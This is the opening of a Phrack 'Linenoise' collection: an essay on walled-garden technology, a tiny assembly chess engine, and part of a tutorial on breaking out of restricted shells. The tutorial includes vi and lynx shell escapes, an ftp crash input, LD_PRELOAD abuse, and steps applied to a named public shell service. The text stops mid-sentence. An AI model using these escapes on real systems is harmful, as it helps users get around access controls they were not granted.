@@ -1,0 +1,3163 @@
+                              ==Phrack Inc.==
+
+                Volume 0x0f, Issue 0x45, Phile #0x04 of 0x10
+
+|=-----------------------------------------------------------------------=|
+|=-----------------------=[  L I N E N O I S E  ]=-----------------------=|
+|=-----------------------------------------------------------------------=|
+|=-------------------------=[     various     ]=-------------------------=|
+|=-----------------------------------------------------------------------=|
+
+
+An old Phrack Staff member and friend used to say that "a strong Linenoise
+makes a good release". 
+
+We begin our journey with an interesting philosophical article, "Hacker
+Luddites" by an anonymous author. TL;DR, ever had an iPhone? Have you
+realized you don't actually own something you paid several hundreds of
+bucks to acquire? The "cloud era" trend, which has convinced many people
+as well businesses, to literally grant owning rights for their data to
+large corporations, is now everywhere. How is it affecting our state of
+mind and where is this going?
+
+Our technical part is very strong. Baudsurfer developed an interesting ASM
+chess game in just 256 bytes; read the heavily-commented code and feel the
+nostalgia in your bones. More old-school goodness in a lovely article
+dealing with secure shells and how one can exploit common misconfigurations
+to bypass various limitations and break out of restricted environments.
+Articles like this have a lot to offer to the hacking community. We urge
+our dear readers to follow DangerMouse's example and submit more articles
+like his!
+
+The next article has a strange back story. We received this submission
+long ago and we decided to publish it. Admittedly, a lot of time has passed
+since then. The author has stopped replying to mails, but he was originally
+positive about publishing his work. Read it and see how you can cause
+short ID key collisions in GPG. As our everyday computing machines become
+increasingly powerful, such attacks become more and more realistic.
+
+Following that are two excellent short articles exploring subjects every
+exploit developer is doomed to deal with, namely boundary conditions and
+shellcoding. Our rotten haxor chown has written a nice guide on how to use
+Microsoft's Z3 solver to facilitate the process of exploit development.
+Recently (well, maybe not so recently, lulz), there has been a shift
+towards more formal methods even by old-school haxors who have always
+preferred and obeyed the KISS (Keep It Simple, Stupid!) primitive. Hackers
+have understood that the process of vulnerability discovery as well as
+exploit development can be augmented by modern mathematics and maybe become
+even more interesting! One cannot easily forget p64_0x08.txt, right? In the
+next article, fishstiqz shows us how you can simply use your compiler to
+easily build shellcodes for Windows. If you ever thought shellcode
+development on Microsoft's operating system is a pain in the ass, then
+this article is definitely for you.
+
+Last but not least we have an opinion piece on the vulnerability
+disclosure circus, the incentives and the related moral questions (lulz)
+by two anonymous contributors. It is balanced and dispassionate and we
+urge you to read it in the same manner.
+
+That's it you greedy mofos, another strong Linenoise! Enjoy!
+
+
+--[ Contents
+
+    1 - Hacker Luddites ................................... anonymous
+
+    2 - Chesslin .......................................... Baudsurfer
+
+    3 - He Compels Secure Shells .......................... DangerMouse
+
+    4 - Personalized PGP Key IDs .......................... f1los0tt1l3
+
+    5 - How to cheat at maths ............................. chown 
+
+    6 - Shellcode the better way, or how to just
+        use your compiler ................................. fishstiqz
+
+    7 - Resisting the Hy(p|v)e ............................ anon & anon
+
+
+|=[ 0x01 ]=---=[ Hacker Luddites - anonymous ]=--------------------------=|
+
+
+In the west, far gone are the days of slavery. Men live freely with their 
+minds and bodies. So the idea of technology potentially limiting these 
+things is absurd.
+
+Computer technology today might not always encourage these principles of 
+free mind and body though. Hardware and software is increasingly built in 
+the same manner as stone walled gardens, restricting those outside the 
+inner circles of technocrats. The designers decide to clutch tightly to 
+their systems, defining the full set of actions allowable and therefore 
+thinkable on their systems. They are limiting the potential for 
+creativity, discovery, and reason in order to further profit. This profit 
+is furthered by control because certain control limits piracy, stops 
+malicious software from propagating, simplifies the user experience for 
+the majority of consumers, and creates revenue through software-regulated 
+micro decisions that constrain the full capacity of the hardware and 
+software systems being sold.
+
+Only the masters of the garden, the designers, are allowed inside the 
+stone walls, where they are free to create and are conscious of the inner 
+workings and plans. Those outside are not allowed inside the garden. Those 
+who are not inside the circle of the original creators do not get to 
+create without delegated permission. And consumers and third-party 
+developers are too far down the caste system to be allowed arbitrary 
+control of their own possessions.
+
+This leaves the creators on the outside of the stoned walls dependent on 
+brilliant and dedicated minds to bypass the wishes of the designers. These 
+brilliant minds attain a level of consciousness about the constraints of 
+the system that the designers themselves did not understand, and pass this 
+on to the masses. Along the way come miscreants, thieves, and pirates.
+
+In a free market system, if more arbitrary creation is vital in the long 
+term, then more creative systems will arise to fill the need. In the short 
+term, allowing feedback from the outer castes and integrating their ideas 
+has been shown to be more than sufficient for sustained exponential growth 
+on the rise to market domination.
+
+
+Hacker Luddite: (Oxymoron) A person opposed to technology that greatly 
+limits, through artificial means, human potential for consciousness, 
+reason, or creativity with that same technology.
+
+Hacker Luddites hate stone wall garden technologies. Why shouldn't a 
+person be allowed to hold a piece of technology and attempt to modify or 
+adapt that technology to suit their will at any given moment? The only 
+limitation should be the consciousness required to make changes. And 
+certainly not artificially restricted by the designers of the technology. 
+In the same way that Kant based the premises of the categorical imperative 
+on the ability for humans to reason, Hacker Luddites view this capacity 
+for reason as a fundamentally important human ability. When computer 
+technology, purchased and entirely in the physical possession of the 
+owner, denies arbitrary modification and creation, it greatly reduces the 
+ability to reason about the universe with that technology. That technology 
+does not allow people to transcend the designers ideas and fully embrace 
+some of their most important human traits. Instead it delegates the 
+consumers to subordinates with restricted consciousness, and restricted 
+capacity for reason, and restricted creativity.
+
+
+Next up, computer technology applied excessively for the conversion of 
+human attention into personal profit.
+
+To the hacker luddites, another nefarious category is the computer systems 
+of the world which have been built to turn human attention into profit. 
+Rather than proceeds coming from the advancement of humanity, the proceeds 
+come primarily from the ability to guide human attention into that 
+technological system. The system might be making the profit through ads, 
+or it could be a game consumers pay for.
+
+It is understood that resources are required to run technologies and that 
+some exchange of information and resources is expected between consumers 
+and creators of that technology. Ads can be helpful to a consumer by 
+showing them products which they actually want, and games or sites for 
+information exchange are highly enjoyable to many people and therefore 
+provide benefit. It is when the methods and means become excessive that 
+hacker luddites take an issue.
+
+When technologies, whether delivering advertisements or games, exploit 
+human psychology and physiology to turn a profit from their consumers, 
+they may often be directly limiting, and in a significant way, the 
+consciousness, reason, or creativity of that consumer.
+
+The other problem is when instead of advertisements showing people what 
+they want, advertisements subconsciously manipulate peoples desires (such 
+as sex, popularity, and power) to override their consciousness and 
+reasoning abilities to get them to want and purchase products regardless 
+of the products abilities to help the consumer attain those desires. 
+
+And what if technologies instead of providing an opportunity for 
+relaxation or fun or profound information sharing or whatever also create 
+systems of psychological control where neurophysics brings users attention 
+back to technology to get addictive releases of dopamine or serotonin or 
+who knows what, using the darker arts of gamification. Or perhaps innate 
+human survival mechanisms related to group dynamics are being exploited by 
+the technology, such as showing automatically generated advertisements, 
+messages, and symbols as endorsed by members of a group, or creating 
+virtual resource systems where drives for competition or collaboration 
+drive behavior. 
+
+It may be that these technologies which capture human attention are simply 
+what most consumers want from their technology, after all 30% of internet 
+traffic generated by humans is for porn [1]. If distraction and the 
+subordination of reason, creativity, or consciousness is the will of the 
+majority, Hacker Luddites seriously disagree with the majority and most 
+definitely oppose the designers that subordinate them.
+
+What defenses does the modern person have to protect against the likes and 
+tweets and clicks and slide to unlocks and checkmarks and tabs and porn 
+and endless dopamine and serotonin harvesting mechanisms? These systems 
+were sometimes built to reap monetary gain, sometimes built for 
+communication control, and sometimes for nothing of any value... in 
+exchange for a portion of the time, attention, and thoughts of the user as 
+well as their information...
+
+
+Don't buy and don't use them. 
+
+If you do use them, use the them only in great moderation and only at 
+consciously specified times. 
+
+Inform others and expose existing and emerging technologies which may be 
+limiting human potential.
+
+Augment the technology in your possession to block advertisements. 
+
+Degrade the quality or value of your attention to the attention-to-profit 
+technologies by: 
+
+- Sharing and proxying accounts with multiple users.
+- Writing user interfaces to the user interfaces.
+- Poisoning user activity with subtle fuzzers alongside your normal 
+activity where it makes sense.
+
+Similarly, make your information more useless by lying.
+
+- Don't bother with real names where they don't matter.
+- Fill out forms like madlibs.
+
+[1] http://www.extremetech.com/computing/123929-just-how-big-are-porn-sites
+-- 30% of the internet traffic out there is porn
+
+
+|=[ 0x02 ]=---=[ Chesslin - Baudsurfer/Red Sector Inc. ]=----------------=|
+
+
+                               [ CHESSLIN ]
+                     [ by Baudsurfer/Red Sector Inc. ]
+
+
+|=--[ Introduction
+
+This is a sizecoding exercise to code a playable chess engine in 256 bytes.
+This POC is very experimental and bears several shortcomings when comparing
+with any other real FIDE existing chess game engine : you have been warned.
+It plays like a fish as AI is reduced to a half-ply max solely, it also has
+no end-game detection, pawns move only a single square, it cannot castle or
+do promotions - let alone en-passant - and takes about a hundred seconds to
+play. It also only works on Microsoft Windows XP SP3. Like minimalist Edlin
+line editor Cheesslin focuses on a single console line. Whites start at the
+bottom of the virtual chess board but SAN notation order is inverse ranks :
+
+   A B C D E F G H
+1  r n b q k b n r
+2  p p p p p p p p
+3
+4
+5
+6
+7  P P P P P P P P
+8  R N B Q K B N R
+
+So in order to test Chesslin one can uudecode below binaries to input first
+algebraic notation "h7h6" characters starting game by moving the White pawn
+on H file from seventh rank to sixth rank. A longer example string sequence
+of gameplay is "h7h6h2h3g8f6h3h4f6g4h4h5g4h2g1h3h2f1h3g5". Remember if your
+keyboard input is not legal chess then Chesslin will silently expect you to
+enter again a conforming four ascii character string just to proceed. Thus,
+if only a single faulty character was entered you will need to fill-in with
+three more "dummy" characters before re-typing a desired algebraic notation
+for validation only occurs every four-chars exactly. All bugs are ofc mine.
+
+|=--[ Chesslin binaries
+
+begin 644 CHESSLIN.COM
+M8/.JF8GXL2!FN"5#-E)FT\`D#ZJ)=0Z);5X,"(A%;X#I`^+DOOO_5KD$`*S-
+M*>+[@/((7W4KV>[?=?J^]?^M..!R#.A#`'('B$7YVP7;'&;_!77GL0*MU!`%
+M8"FKXO?K$8G^B?>Q!)C-%JKB^N@9`'+QZ`,`:"0!K2UA,=40B<>$R74"ABTD
+MB,-@OOO_L0CH2P!T1C#"A,IU0(G[B,;H/`!T!C#"A,IU,2G?HO7_B/`D!Z@!
+M=`*Q!#P!N^4!UY=U$/;&"'4"9J^$[;D"`'4"2:\!W_*N=`3K`5CY8</HF/]U
+@]P^P!<,5!Q,/#P_?X>[R#A(?(?`0_P$/$?'O\.`/$1`/
+`
+end
+
+|=--[ Chesslin source code
+
+;   "You don't need eyes to see You need vision." - Faithless       _
+;   Special greets to : Impure ASCII 1940 and Divine Stylers!      | |
+;   Greets : Alco Bon^2 BReWErS CODEX Flush Lineout Mandarine   .--' `--.
+;   Onslaught Paranoimia Quartex Rebels Razor1911 RiOT Titan.   `--. .--'
+;       _     _          _                _          _          ___| |___
+; ______)\___ )\_________)\_______________)\_________)\        /         \
+;/________ __\\  __________ _________ ____ /____ ____ /        \         /
+;   ______)\\__  \____  ___)\_____  _)\  /(_____)\  /(____      \       /
+; _/  _   _/  /   _   \_\____ _   \_\  \/    _/\  \/    _/       \     /
+; \    \  \___\__  \        / \) __\___ __  /_\___ __  /_____   __>   <__
+;  \    \_/     /   \      /   \/     /__\)_    _/__\)_     /  (___   ___)
+;   \    /     /____/\    /\   /\    /   /\/    X   /\/    /      |   |
+;   /_________/       \__/  \_______/_\____ ___/ \________/  ::::;|   |
+;:                                 ___)\ __)\____________         |   |;: :
+;.-------------------------------, \    \\_\ \_____ ____/ gRK     |   |
+;\Red Sector Incorporated presents\ \    \_(__)_  _)\   ___      (     )
+; \Chesslin minimalist chess engine\ \    \    (__)  \_/  /_    _/     \_
+;  \A 256 bytes DOS tiny intro XPSP3\ \    \     \     _ / \   _>       <_
+;   \For Phrack Magazine #0x45 _ 2016\ \    \/    \    \    \_(___________)
+;;;;,\Coded by Baudsurfer\RSi  \\ &FU \ \   /\     \    \_____X___________>
+;      `------------------------' `----'  \_/  \_____\___/
+w equ word                ; 16-bit prettifying helper,Chesslin v1.0 in 2016
+d equ dword               ; 32-bit prettifying helper,fasm assembler syntax
+  org 100h                ; binary ip execution seg start address above psp
+  pusha                   ; para down stack and avoid input buff collisions
+  rep stosb               ; prepare board empty squares assumes ax=0 cx=255
+  cwd                     ; set Black=0=top active player turn, White=8=bot
+  xchg ax,di              ; shorter mov di,ax prepares writing segment base
+  mov cl,20h              ; 32 initialization decoding bit rotations in all
+a:mov eax,52364325h       ; back-rank "rnbqkbnr" nibble-encoded 32b pattern
+  rol eax,cl              ; rotate next Black chess piece value in lsnibble
+  and al,15               ; isolate a Black chess piece value from lsnibble
+  stosb                   ; left-to-right write Black back-rank major piece
+  mov [di+0eh],si         ; left-to-right write Black pawns assumes si=100h
+  mov [di+5eh],bp         ; left-to-right write White pawns assumes bp=9xxh
+  or al,8                 ; transforms Black back-rank major piece to White
+  mov [di+6fh],al         ; left-to-right write White back-rank major piece
+  sub cl,3                ; fixes back-rank pattern nibble rotation counter
+  loop a                  ; file-by-file ranks init loops 20h/(3+1)=8 times
+b:mov si,0fffbh           ; point source index to algebraic notation buffer
+  push si                 ; shorter save of algebraic notation buffer start
+  mov cx,4                ; print dword ascii algebraic notation buffer str
+c:lodsb                   ; get one of four usr/cpu bytes from ascii buffer
+  int 29h                 ; dos api fast console out display char al=[di++]
+  loop c                  ; continue until ascii file-first pair chars left
+  xor dl,8                ; alternate active player turn Black=0 or White=8
+  pop di                  ; shorter restore algebraic notation buffer start
+  jnz h                   ; if active player turn is White then do keyboard
+  fldz                    ; else Black active player turn fpu load +0.0 cst
+  fbstp [di-6]            ; and store back 80-bit packed bcd decimal number
+e:mov si,0fff5h           ; zeroed this,best score 0fff5h and coords 0fff7h
+  lodsw                   ; move lsb=potential capture vs. msb=best capture
+  cmp al,ah               ; compare this capture value against best capture
+  jc f                    ; prune calculations if capture already lower val
+  call n                  ; else verify the attack potential chess legality
+  jc f                    ; capture higher value but move was illegal chess
+  mov [di-7],al           ; successful calculation thus store newer highest
+  fild d [di]             ; successful calculation thus load current coords
+  fistp d [si]            ; successful calculation thus store highest coord
+f:inc d [di]              ; resume exploring exhaustive [0;0ffffh] interval
+  jnz e                   ; including subset ["1a1a";"8h8h"] until finished
+  mov cl,2                ; convert int32 to two file-first algebraic words
+g:lodsw                   ; get first int16 msw/lsw algebraic notation word
+  aam 16                  ; integer to expanded zero-based file/rank nibble
+  add ax,2960h            ; translate file/rank to ascii chess board origin
+  stosw                   ; write pair=half of the ascii move buffer string
+  loop g                  ; get next int16 msw/lsw words algebraic notation
+  jmp k                   ; and proceed examining ascii move buffer strings
+h:mov si,di               ; di points to 0fffbh for both input and verifify
+i:mov di,si               ; resets every input to algebraic notation buffer
+  mov cl,4                ; one file-first algebraic notation is four bytes
+j:cbw                     ; zero accumulator msb to set funct get keystroke
+  int 16h                 ; al=dos bios keyboard services api blocking read
+  stosb                   ; src file=fffb;rank=fffc dst file=fffd;rank=fffe
+  loop j                  ; all file-first algebraic ascii quartet inputed?
+  call n                  ; else verify algebraic ascii move is legal chess
+  jc i                    ; if not then proceed to ask user input move anew
+k:call l                  ; converts algebraic notation buffer ascii source
+  push w b                ; redirect second fall-through return to printout
+l:lodsw                   ; algebraic notation buffer ascii source then dst
+  sub ax,3161h            ; convert to zero-based alphanumerical 3161h="a1"
+  aad 16                  ; convert to x88 board representation (al+=ah*16)
+  mov di,ax               ; add x88 chess board representation memory start
+  test cl,cl              ; verify caller's asked mode is passive or active
+  jnz m                   ; call asked mode mutex is passive so skip writes
+  xchg [di],ch            ; call asked mode mutex is active so write board!
+m:and al,88h              ; test if inside main chess board x88 bitmask use
+  ret                     ; return to standard callers or printout redirect
+n:pusha                   ; save reg vals in: si=fff7h/fffbh di=fffbh/ffffh
+  mov si,0fffbh           ; point source index to current ascii move buffer
+  mov cl,8                ; set passive mode count mutex for only verifying
+  call x                  ; convert buffer ascii src pair to x88 memory add
+  jz u                    ; source is non-conforming : illegal empty square
+  xor dl,al               ; sets move conformitiy using active player color
+  test dl,cl              ; test move conformity using active player colour
+  jnz u                   ; source is non-conforming : opponent turn colour
+  mov bx,di               ; else if source conforming then save piece addr.
+  mov dh,al               ; else if source conforming then save piece value
+  call x                  ; convert buffer ascii dest to x88 memory address
+  jz o                    ; if move nature not an attack skip over captures
+  xor dl,al               ; sets move conformitiy using active player color
+  test dl,cl              ; test move conformity using active player colour
+  jnz u                   ; destination is non-conforming : same turn color
+o:sub di,bx               ; source & destination conforming so obtain delta
+  mov [0fff5h],al         ; save piece value as non-transactional potential
+  mov al,dh               ; restore previous saved move source piece nature
+  and al,7                ; normalize gray piece nature colorless isolation
+  test al,1               ; determine source piece's parity interval length
+  jz p                    ; piece face=piece nature=piece value=piece score
+  mov cl,4                ; override halfing default interval len if parity
+p:cmp al,1                ; test if moving piece is a special handling pawn
+  mov bx,y                ; piece memory address off-by-one index ret fixed
+  xlatb                   ; move piece original start offset memory address
+  xchg ax,di              ; offset becomes accumulator becomes displacement
+  jnz s                   ; leave if move source piece not special handling
+  test dh,8               ; else adjust move source pawn color displacement
+  jnz q                   ; no White pawn displacement sub-interval fixings
+  scasd                   ; displacement interval offset+=4 for black pawns
+q:test ch,ch              ; verify if pawn is attacking an opponent piece ?
+  mov cx,2                ; loop index clears msb placeholder also sets lsb
+  jnz s                   ; if non-empty square : pawn attacking diagonally
+  dec cx                  ; else decrease parity interval size special case
+r:scasw                   ; displacement interval start+=2 prunes attacking
+s:add di,bx               ; set displacement interval scanning start offset
+  repnz scasb             ; verify move exists in displacement sub-interval
+  jz v                    ; ZF set legal src piece displacement delta found
+  jmp u                   ; illegal src piece displacement: delta not found
+t:pop ax                  ; bail shotcircuits nested dataflow function call
+u:stc                     ; carry mutex persists indicating move is illegal
+v:popa                    ; persistant CF mutex is indicator to legal chess
+  ret                     ; restore move mode mutex cl=passive or cl=active
+x:call l                  ; verify this move legal within inside main board
+  jnz t                   ; exits for illegal move piece outside main board
+  cmpxchg [di],al         ; discriminate from special case zero return vals
+y:db 195,21,7,19,15,15,15 ; p[1]PF4,n[2]PF8,b[3]PF4,q[4]PF8,r[5]PF4,k[6]PF8
+z:db -33,-31,-18,-14,14   ; prev label is ret+1 parity displacement offsets
+  db 18,31,33,-16,16,-1,1 ; z array is displacement overlap interval values
+  db 15,17,-15,-17,-16    ; knight rook+8 bishop+12 pawns White+12 Black+18
+  db -32,15,17,16         ; queen and king moves are rook+bishop+pawn moves
+
+
+|=[ 0x03 ]=---=[ He Compels Secure Shells - DangerMouse ]=---------------=|
+
+
+|=-----------------------------------------------------------------------=|
+|=----------------------=[ He Compels Secure Shells ]=-------------------=|
+|=-----------------------------------------------------------------------=|
+|=------------------------=[ by DangerMouse ]=---------------------------=|
+|=-----------------------------------------------------------------------=|
+
+
+--[ Table of Contents
+
+--[ Introduction
+--[ Exploration - Primitive Gathering.
+----[ Execution Primitive
+----[ Write Primitive
+----[ Read Primitive
+--[ A real life example - freeshell.org
+--[ A real life example - Private shell box
+--[ Attacking the transport 
+--[ Conclusion
+--[ References
+--[ Appendix A - Common commands with useful primitives
+--[ Appendix B - psh Source code 
+
+--[ Introduction
+
+Welcome reader, in this small text we will look at a scenario which is
+probably familiar to most of you. That is, breaking out of secure shells.
+
+For those of you who don't know, a common scenario exists where an
+administrator of some kind of device wishes to grant restricted access to
+the functionality of that device. To accomplish this he/she will create a
+shell (graphical or cli) which provides a subset of the features of the
+system to the user. This may be as simple as replacing the user in
+question's UNIX account shell with a custom written readline() loop which
+executes options from a set list of commands.
+
+There are numerous pit-falls associated with this practice which provide us
+with a means to escalate our privileges from within the restricted shell.
+In this write-up we will examine some of these pitfalls, as well as look at
+the general process for investigating a restricted shell and eventually
+breaking out to a higher entitled environment. To illustrate these points
+we will look at some real life examples of secure shells and how we can
+break them.
+
+Some examples of pre-packaged, existing restricted shells are:
+rbash/rssh/smrsh/rksh, however there also exists an endless array of custom
+shells written for one off cases.
+
+--[ Exploration - Primitive Gathering.
+
+When investigating a secure shell environment, I find it best to
+systematically explore each of the options within the shell looking to
+collect certain primitives with which to elevate the options available.
+
+----[ Execution Primitive
+
+Typically the most useful primitive which we gain is the execute primitive.
+Sometimes the ability to execute arbitrary commands is enough to break out
+of the shell, for example executing a more complete shell such as bash from
+within a restricted shell can often be enough to completely invalidate the
+security of the system. Some examples of how to gain this primitive are:
+
+ - Using the shell execute feature of many common shell commands, for
+   example using the "!<shell command>" feature of the less pager.
+ - Invoking the execution of a text editor (often defined by the EDITOR
+   variable) from within another application. Then using shell execute
+   features of the editor to escape. 
+ - Combining other primitives to hijack execution of exposed applications.
+
+Here is a commonly used example of using the vi command to gain an
+execution primitive:
+
+    ~$ vi
+    :set shell=/bin/sh
+    :shell
+    bash$
+
+From a GUI perspective, many years ago, after drinking at a conference we
+decided it would be fun to create a game around breaking out from the many
+netcafe's which littered the streets at this time. These netcafes used to
+provide a restricted windows GUI with functionality removed, and the goal
+was to race to break out, without using any real 0day.
+
+Often in this scenario an easy win was provided by invoking the mirc32.exe
+application (when it was whitelisted) and then using the /exec command to
+invoke cmd.exe. Another option was to set the handler for telnet:// uri's
+in the browser to cmd.exe and spawn it that way.
+
+Another byproduct of using software in an unintended way is that the
+security evaluation of the product technically neglects the permiters that
+are being exposed to an untrusted user. This means that often there are
+trivial memory corruption bugs exposed in the application which go
+unreported since even when people find them they do not care a great deal.
+
+eg:
+
+    $ perl -e'print "A"x50,"\n"' | ftp 
+    Segmentation fault: 11
+
+It is definitely worthwhile auditing some of the commonly included commands
+in secure shells for easily triggerable memory corruption bugs, since these
+can often be all that's needed to gain the execution primitive and win.
+
+Another common method of gaining the execution primitive is to abuse
+environment variable control to influence the dynamic linker. Typically
+this means setting the LD_PRELOAD/DYLD_INSERT_LIBRARIES/Whatever variable
+that provides a mechanism for injecting shared objects into a process as
+soon as the dynamic linker loads. Obviously for this to work we also need a
+write primitive before hand to store the library we wish to load somewhere.
+The tmux example later in the paper shows a real life case where this was
+possible.
+
+----[ Write Primitive
+
+Obviously in some cases we cannot easily gain the execute primitive. In
+these cases we also looking for additional primitives which we can leverage
+to eventually gain an execution primitive. 
+
+Finding a write primitive is usually pretty easy. Most applications need
+some way to retain state between runs. Some examples are:
+
+ - Input redirection operators ('>', '>>', '>|', '<>', '>&', '&>', etc)
+ - Save ability of applications, text editors, etc
+ - Log files
+
+In one case I saw, a write primitive alone was enough to break out of the
+restricted shell. By writing to a .unrestricted_user file within the home
+directory of your user account, the next login was presented with a bash
+shell. This is not typically the case though. 
+
+When a write primitive is aquired it is also worth keeping in mind the
+trick mentioned in [3]. If any of the invoked shell commands use wildcard
+expansion on a directory, it can sometimes be possible to create files
+beginning with the '-' character, to pass arguments to those commands.
+
+As you will see in the real life examples below, write primitives are
+typically available in most applications, and can easily be leveraged in a
+variety of ways to continue breaking out of the shell.
+
+----[ Read Primitive
+
+When talking about a read primitive, we need some way to read an arbitrary
+file from the file system and display its contents on the screen.
+
+Sometimes this can be relatively straight forward, for example in a shell
+which uses /usr/bin/less as a pager, you can use the :e (examine) command
+to open an alternative file. However often with less you can execute a
+command with ! as well, but in a case where you are unaware of the file
+system, you can use the e command to brute force directory structure to
+find things which are worthwhile executing.
+
+Other applications are less straight forward, sometimes the read primitive
+may be filtered, or evaluated as a config file for the program. In these
+cases, sometimes contents of the file can only be retreived via error
+messages. Basically whenever you see a file path being provided to an
+application, you can test it wtih some known files to see if there is a way
+to retreive the contents.
+
+Even when it is im-possible to retrieve the contents of a file, sometimes a
+program will respond differently when a file exists or not. This may be
+easily noticed, or something subtle like return codes. This leak can be
+used to map out the file system.
+
+--[ A real life example - freeshell.org
+
+Now that we've looked at a more generic approach to defeating secure
+shells, we will look at some real world examples. The first of which is the
+restrcited shell "psh" which is used in the freeshell.org environment. (SDF
+Public Access UNIX System).
+
+Before we get started looking at freeshell.org, i'd just like to say, I
+have nothing but respect for freeshell.org. I have been playing with the
+restricted shell on there for around 12 years, and have broken it a number
+of ways. Several times I have contacted the admins to let them know. To me
+this has provided a constantly evolving wargame which has been hours of
+fun. 
+
+The process of setting up an account on freeshell.org is really simple.
+By ssh'ing into the freeshell.org box as the user "new" you are redirected
+to a sign up process.
+
+$ ssh new@freeshell.org
+
+You will now be connected to NEWUSER mkacct server.
+Please login as 'new' when prompted.
+
+[RETURN] 
+
+THIS MAY TAKE A MOMENT .. Trying 192.94.73.20...
+Connected to 192.94.73.20.
+Escape character is 'off'.
+
+NetBSD/amd64 (ol) (pts/2)
+
+login: new
+
+Welcome to the SDF Public Access UNIX System - Est. 1987
+You are the 79th guest today, logged in on 02-Sep-15 17:05:23.
+
+Are you using Windows 2K or XP? (Y/N) N
+
+------
+
+This new user process takes us to the first restricted shell. FEP.
+Typing `help` shows us the following menu:
+
+FEP Command: help  
+
++--------------------------------------------------------------+
+|COMMAND             | DESCRIPTION                             |
++--------------------------------------------------------------+
+|what                | what is the SDF public access UNIX?     |
+|w2k                 | important info for Windows 2k/XP users  |
+|mkacct              | create your own UNIX shell account      |
+|dialup              | US & Canada SDF dialup access           |
+|teach               | for teachers and UNIX class instructors |
+|traceroute  {host}  | map a route to a specified host         |
+|whois       {host}  | list whois directory entry for a domain |
+|ruptime             | display system status                   |
+|finger      {user}  | check if a login is available           |
+|software            | ported and installed software packages  |
+|mil                 | information about our US Military Waiver|
+|logout              | disconnect from sdf.org                 |
++--------------------------------------------------------------+
+
+As you can see this provides us with some basic applications which we can
+run, but also allows us to kick off the mkacct process to make our own
+account. 
+
+By running the finger command on our current user (new). We can see that
+the new user has a shell of /sys/new/mkacct, which is the restricted shell
+we are in.
+
+FEP Command: finger new
+Login: new                              Name: SDF newuser
+Directory: /sys/new                     Shell: /sys/new/mkacct
+On since Wed Sep  2 17:05 (UTC) on pts/2 (messages off)
+No Mail.
+
+The next thing we can see, is that they have not sanitized the arguments to
+finger. This means that we can pass arguments to the commands listed in the
+menu, this is a common mistake that people make when making restricted
+shells.
+
+FEP Command: finger -?
+finger: unknown option -- ?
+usage: finger [-lmpshog8] [login ...]
+
+If we enter finger by itself, we are prompted with the usage, rather than
+displaying all users on the system logged in.
+
+FEP Command: finger 
+usage: finger {user}
+
+However by passing in --, telling getopts to terminate arguments, we can
+accomplish the same thing, and list users logged into the system.
+
+FEP Command: finger --
+Login    Name                Tty      Idle  Login Time   Office     Office
+Phone
+new      SDF newuser        *pts/2       -  Wed 17:05    
+smj      Stephen M. Jones    pts/0      33  Tue 21:39    
+smj      Stephen M. Jones    pts/4      33  Wed 16:34 
+
+This shell is not the focus of the write-up however, instead, if we run the
+mkacct command, we are prompted for a user-name and password, and able to
+log into our shiney new psh shell.
+
+---
+
+You are about to create a UNIX shell account.  This account may be unlike
+anything you've used before.  We urge you to carefully read all the text
+displayed on your terminal, as it will aide you in your learning.
+We also encourage you to try all the commands available with your new
+account.  There are many types of games, applications and utilities
+you will be able to instantly run in just a few moments.  If you are
+looking for a particular command or version of a command that we do not
+have, there are ways to request that it be installed.  We also offer DIALUP
+and DSL in the USA and Canada which you will be able to learn about
+shortly.  Be patient, read what is displayed - Explore and Enjoy!
+
+[RETURN]
+
+First, you need to choose a LOGIN.  A LOGIN allows you to LOG IN
+to the system.  Your LOGIN can be 1 to 16 characters in length and
+can be composed of alpha-numeric characters (middle period is OK).
+
+What would you like to use for your login? 
+
+...
+
+Type 'help' for Commands.
+Type 'com' to chat with other users.
+Type 'ttytter' to listen to Twitter Tweets anonymously.
+Type 'mud' to play the SDFmud.
+Type 'mkhomepg' to set up your personal website.
+
+
+Did you know you can become a permanent LIFETIME member of SDF
+by making a onetime donation of $36?  Type 'arpa' for more info!
+
+sdf:/udd/d/dangermouse> 
+sdf:/udd/d/dangermouse> help
+SDF psh Version 8 - *PREVALIDATED SHELL ACCOUNT*
+
+ what         - what can I use this account for?
+ unix         - a listing of UNIX commands available to you NOW
+ how          - information on increasing membership
+ teach        - using SDF in a classroom setting
+ dialup       - information about SDF dialup service
+ arpa         - about lifetime arpa membership
+ bboard       - sdf user message boards
+ commode      - chat with other users online
+ ysm          - chat on the ICQ network
+ bsflite      - chat on the AIM network
+ msnre        - chat on the MSN network
+ ttytter      - listen to Twitter tweets anonymously
+ lynx         - browse the WWW textually or access GOPHER
+ bksp         - set your BACKSPACE key
+ faq          - frequently asked questions
+ software     - display software programs installed on the system
+ quote        - get a real time stock quote
+ games        - a listing of available games
+ thxmoo       - connect to the THXMOO
+ mud          - connect to the SDFmud
+ validate     - gain additional shell access (also try 'user' for details)
+
+sdf:/udd/d/dangermouse>
+
+----
+
+As you can see, this shell gives us access to a variety of unix utilities
+as well as perform some basic shell commands such as cat/cd/etc. However
+this is a little deceiving as many of the commands are filtered. We can
+change directory anywhere on the system, which is useful for exploring the
+directory structure, however when we try to cat files to view their
+contents we can see that only files in our home directory are available.
+
+The first method which I found for breaking out of psh revolved around 
+the "lynx" text based web browser. My first thought was to open file://
+based urls however they have disabled the ability to browse to arbitrary
+locations.
+
+My next thought was to spawn a shell with !, however when you attempt this,
+the message "Spawning is disabled!" is shown. From this it was possible to
+determine that lynx was being spawned with the "-restrictions=all" command
+line argument. However, due to the nature of getopts() (the c library
+function for parsing command line arguments) it is often possible to
+re-enter the case associated for a particular argument. With this in mind
+we could specify a new value for -restrictions, and spawn a shell with the
+"!" key from within the new lynx. This has long been fixed in both lynx and
+the SDF shell, psh.
+
+The most recent way in which I escaped the psh shell was much more
+complicated than the lynx method. The first step was to identify where the
+source code for psh is located. Trying to change directory to an invalid
+directory leaks this information, as seen below.
+
+faeroes:/usr> cd doesnotexist
+/usr/local/bin/psh[611]: cd: /usr/doesnotexist - No such file or directory
+
+Next, I needed to view the source code of the psh, in order to look for
+potential ways to escape. Attempting to use "cat" or "pico" to view this
+file however, shows that they have placed restrictions around viewing files
+outside of the home directory.
+
+    sdf:/usr/local/bin> cat /usr/local/bin/psh
+    usage: cat {filename}
+
+Looking back at our list of possible applications to exploit for our
+primitives I quickly fell apon the next most complex in the list, the
+"mutt" mail client.
+
+By pressing the E key on an email in mutt, it's possible to invoke the
+command stored in the EDITOR environment variable, in the case of psh, this
+is:
+
+    EDITOR=/usr/pkg/bin/pico
+
+However, since pico is executed from within mutt, the -o (sandbox) option
+is not used. This means that from within the spawned pico process we can
